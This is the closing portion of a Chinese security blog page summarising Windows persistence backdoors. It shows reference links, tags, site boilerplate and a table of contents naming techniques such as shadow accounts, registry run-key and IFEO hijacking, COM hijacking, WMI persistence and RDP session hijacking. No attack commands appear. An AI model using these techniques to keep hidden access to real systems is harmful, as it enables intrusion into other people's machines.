+<p><a href="http://www.atomsec.org/%E9%80%86%E5%90%91/appinit_dlls%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5dll/" target="_blank" rel="external">http://www.atomsec.org/%E9%80%86%E5%90%91/appinit_dlls%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5dll/</a></p>
+<p><a href="https://payloads.online/archivers/2018-10-14/1" target="_blank" rel="external">https://payloads.online/archivers/2018-10-14/1</a></p>
+<p><a href="https://github.com/wings27/blogs/blob/master/%E5%88%A9%E7%94%A8Windows%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E9%BB%98%E8%AE%A4%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9B%BF%E6%8D%A2.md" target="_blank" rel="external">https://github.com/wings27/blogs/blob/master/%E5%88%A9%E7%94%A8Windows%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E9%BB%98%E8%AE%A4%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9B%BF%E6%8D%A2.md</a></p>
+<p><a href="https://www.anquanke.com/post/id/151425" target="_blank" rel="external">https://www.anquanke.com/post/id/151425</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/</a></p>
+<p><a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/" target="_blank" rel="external">https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/</a></p>
+<p><a href="https://github.com/Ridter/Intranet_Penetration_Tips/blob/master/README.MD" target="_blank" rel="external">https://github.com/Ridter/Intranet_Penetration_Tips/blob/master/README.MD</a></p>
+<p><a href="https://www.4hou.com/system/5171.html" target="_blank" rel="external">https://www.4hou.com/system/5171.html</a></p>
+<p><a href="https://www.secpulse.com/archives/52053.html" target="_blank" rel="external">https://www.secpulse.com/archives/52053.html</a></p>
+<p><a href="https://www.secpulse.com/archives/39555.html" target="_blank" rel="external">https://www.secpulse.com/archives/39555.html</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-10346.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-10346.html</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-8189.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-8189.html</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-8290.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-8290.html</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-8260.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-8260.html</a></p>
+<p><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="external">https://github.com/3gstudent/Office-Persistence</a></p>
+<p><a href="https://www.jianshu.com/p/4c1af7889e87" target="_blank" rel="external">https://www.jianshu.com/p/4c1af7889e87</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/</a></p>
+<p><a href="https://www.secpulse.com/archives/55476.html" target="_blank" rel="external">https://www.secpulse.com/archives/55476.html</a></p>
+<p><a href="https://www.freebuf.com/articles/web/180581.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/180581.html</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="瓦都剋 WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="瓦都剋 Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      瓦都剋
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/" title="Linux、Windows权限维持常用后门学习总结:windows篇">http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/应急响应/" rel="tag"><i class="fa fa-tag"></i> 应急响应</a>
+          
+            <a href="/tags/权限维持/" rel="tag"><i class="fa fa-tag"></i> 权限维持</a>
+          
+            <a href="/tags/后门/" rel="tag"><i class="fa fa-tag"></i> 后门</a>
+          
+            <a href="/tags/windows/" rel="tag"><i class="fa fa-tag"></i> windows</a>
+          
+            <a href="/tags/挖矿/" rel="tag"><i class="fa fa-tag"></i> 挖矿</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/09/Linux、Windows权限维持常用后门总结/" rel="next" title="Linux、Windows权限维持常用后门学习总结：Linux篇">
+                <i class="fa fa-chevron-left"></i> Linux、Windows权限维持常用后门学习总结：Linux篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="瓦都剋" />
+          <p class="site-author-name" itemprop="name">瓦都剋</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">89</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">79</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://am4zing.me/" title="王小岩" target="_blank">王小岩</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yangge.me/" title="杨大成" target="_blank">杨大成</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.secpulse.com/" title="安全脉搏" target="_blank">安全脉搏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF模块"><span class="nav-number">1.</span> <span class="nav-text">MSF模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Metsvc"><span class="nav-number">1.1.</span> <span class="nav-text">Metsvc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Persistence"><span class="nav-number">1.2.</span> <span class="nav-text">Persistence</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Scheduleme-amp-Schtasksabuse"><span class="nav-number">1.3.</span> <span class="nav-text">Scheduleme&Schtasksabuse</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计划任务"><span class="nav-number">2.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影子账户"><span class="nav-number">3.</span> <span class="nav-text">影子账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerShell后门"><span class="nav-number">4.</span> <span class="nav-text">PowerShell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Empire框架"><span class="nav-number">4.1.</span> <span class="nav-text">Empire框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Schtasks-Backdoor"><span class="nav-number">4.2.</span> <span class="nav-text">Schtasks-Backdoor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MSF"><span class="nav-number">4.3.</span> <span class="nav-text">MSF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MOF"><span class="nav-number">4.4.</span> <span class="nav-text">MOF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表"><span class="nav-number">5.</span> <span class="nav-text">注册表</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Run-RunOnce-Keys"><span class="nav-number">5.1.</span> <span class="nav-text">Run/RunOnce Keys</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BootExecute-Key"><span class="nav-number">5.2.</span> <span class="nav-text">BootExecute Key</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Userinit-Key"><span class="nav-number">5.3.</span> <span class="nav-text">Userinit Key</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LogonScripts-key"><span class="nav-number">5.4.</span> <span class="nav-text">LogonScripts key</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Startup-Keys"><span class="nav-number">5.5.</span> <span class="nav-text">Startup Keys</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Browser-Helper-Objects"><span class="nav-number">5.6.</span> <span class="nav-text">Browser Helper Objects</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AppInit-DLLs"><span class="nav-number">5.7.</span> <span class="nav-text">AppInit_DLLs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件关联"><span class="nav-number">5.8.</span> <span class="nav-text">文件关联</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#映像劫持-IFEO"><span class="nav-number">5.9.</span> <span class="nav-text">映像劫持(IFEO)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#COM劫持"><span class="nav-number">5.10.</span> <span class="nav-text">COM劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CLR"><span class="nav-number">5.10.1.</span> <span class="nav-text">CLR</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CAccPropServicesClass-amp-MMDeviceEnumerato"><span class="nav-number">5.10.2.</span> <span class="nav-text">CAccPropServicesClass&MMDeviceEnumerato</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MruPidlList"><span class="nav-number">5.10.3.</span> <span class="nav-text">MruPidlList</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统软件"><span class="nav-number">6.</span> <span class="nav-text">系统软件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wmi"><span class="nav-number">6.1.</span> <span class="nav-text">wmi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Waitfor-exe"><span class="nav-number">6.2.</span> <span class="nav-text">Waitfor.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bitsadmin"><span class="nav-number">6.3.</span> <span class="nav-text">bitsadmin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msdtc"><span class="nav-number">6.4.</span> <span class="nav-text">msdtc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netsh"><span class="nav-number">6.5.</span> <span class="nav-text">Netsh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DoubleAgent"><span class="nav-number">6.6.</span> <span class="nav-text">DoubleAgent</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Office"><span class="nav-number">6.7.</span> <span class="nav-text">Office</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#劫持Office软件的特定功能"><span class="nav-number">6.7.1.</span> <span class="nav-text">劫持Office软件的特定功能</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用Office加载项"><span class="nav-number">6.7.2.</span> <span class="nav-text">利用Office加载项</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shift后门"><span class="nav-number">7.</span> <span class="nav-text">shift后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RDP会话劫持"><span class="nav-number">8.</span> <span class="nav-text">RDP会话劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#other"><span class="nav-number">9.</span> <span class="nav-text">other</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章："><span class="nav-number">9.1.</span> <span class="nav-text">参考文章：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">瓦都剋</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/';
+          this.page.identifier = '2019/03/27/Linux、Windows权限维持常用后门总结2/';
+          this.page.title = 'Linux、Windows权限维持常用后门学习总结:windows篇';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
